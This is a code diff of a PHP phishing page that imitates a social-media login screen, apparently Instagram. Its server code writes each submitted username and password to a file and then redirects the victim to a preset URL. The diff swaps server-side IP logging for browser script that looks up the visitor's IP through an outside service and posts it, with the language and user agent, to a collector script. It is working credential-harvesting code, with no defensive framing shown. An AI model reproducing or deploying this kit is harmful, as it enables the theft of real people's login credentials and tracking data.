@@ -1,21 +1,5 @@
 <?php
-function get_IP_address()
-{
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
+if (isset($_POST['username'])){
 $u = $_POST['username'];
 $p = $_POST['password'];
 $f = fopen('redir.txt','r');
@@ -26,6 +10,7 @@ if ($u && $p){
   fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
   fclose($f);
   echo "<script>window.open('".$r."','_top')</script>";
+}
 }
 ?>
 <!DOCTYPE html>
@@ -359,9 +344,31 @@ __s={"js":{"149":"/static/bundles/es6/PasswordEncryptionLogger.js/c4545dca7ba4.j
     
 
 <div class="Z2m7o"><div class="CgFia "></div></div><div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div>
-<?php  ?>
 <script>
   document.getElementsByName('username')[0].addEventListener('focus',function(){document.getElementsByClassName('f0n8F ')[0].className='f0n8F FATdn'})
   document.getElementsByName('password')[0].addEventListener('focus',function(){document.getElementsByClassName('f0n8F ')[1].className='f0n8F FATdn';document.getElementById('submit-btn').disabled=false;})    
+</script>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
 </script>
 </body></html>
